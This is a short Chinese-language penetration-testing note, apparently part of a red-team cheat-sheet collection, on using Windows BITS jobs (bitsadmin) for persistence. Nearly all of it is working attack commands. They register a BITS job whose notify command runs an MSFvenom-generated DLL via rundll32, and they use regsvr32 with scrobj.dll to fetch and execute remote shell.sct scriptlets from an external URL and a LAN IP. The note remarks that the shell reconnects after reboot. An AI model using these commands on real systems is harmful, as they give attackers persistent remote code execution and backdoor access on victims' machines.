	创建下载任务
	>bitsadmin /create empire
	下载的文件设置
	>bitsadmin /addfile empire %comspec% c:\windows\temp\1.exe
	设置传输时运行的命令,MSFvenom生成dll放入temp目录
	>bitsadmin /SetNotifyCmdLine empire cmd.exe "cmd.exe /c rundll32 c:\windows\temp\1.dll,0"
	(bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://x.com/shell.sct scrobj.dll")
	启动任务
	>bitsadmin /resume empire
	列出所有用户的下载任务
	>bitsadmin /list /allusers /verbose
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/459.png)


	重启后也会上线
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/460.png)

	完成任务
	>bitsadmin /complete empire
	>bitsadmin /cancel <Job> //删除某个任务
	>bitsadmin /reset /allusers //删除所有任务
	&
	>bitsadmin /create mission
	>bitsadmin /addfile mission %comspec% %temp%\cmd.exe
	>bitsadmin.exe /SetNotifyCmdLine mission regsvr32.exe "/u /s /i:http://192.168.0.107/shell.sct scrobj.dll"
	>bitsadmin /Resume mission